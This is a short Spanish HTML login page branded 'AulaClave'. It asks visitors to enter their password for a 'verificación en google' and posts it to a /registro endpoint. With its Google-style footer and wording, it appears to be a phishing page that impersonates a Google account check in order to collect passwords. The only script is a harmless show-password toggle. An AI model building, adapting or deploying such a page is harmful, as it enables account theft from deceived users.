
<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Contraseña · AulaClave</title>
  <link rel="stylesheet" href="/styles.css">
</head>
<body>
  <main class="panel">
    <section class="intro">
      <div class="logo" aria-label="AulaClave">
</div>
      <h1>Te damos la bienvenida</h1>
      <p class="muted">Ingresa tu contraseña para tu verificación en google.</p>
    </section>

    <section class="content">
      <p></p>

      <form method="post">
        <label class="sr-only" for="password">Contraseña</label>
        <input
          id="password"
          name="password"
          type="password"
          placeholder="Contraseña"
          autocomplete="new-password"
          minlength="8"
          maxlength="128"
          required
        >
        <label class="show-password" for="togglePassword">
  <input type="checkbox" id="togglePassword">
  Mostrar contraseña
</label>

        <button
          class="primary"
          type="submit"
          formaction="/registro"
        >Verificar cuenta</button>

       

      <p><a href="/">Volver al correo</a></p>
    </section>
  </main>

  <footer>
    <span>Español</span>
    <nav>
      <a href="#ayuda">Ayuda</a>
      <a href="#privacidad">Privacidad</a>
      <a href="#condiciones">Condiciones</a>
    </nav>
  </footer>
    <script>
  const passwordInput = document.getElementById("password");
  const togglePassword = document.getElementById("togglePassword");

  togglePassword.addEventListener("change", function () {
    passwordInput.type = this.checked ? "text" : "password";
  });
</script>
</body>
</html>
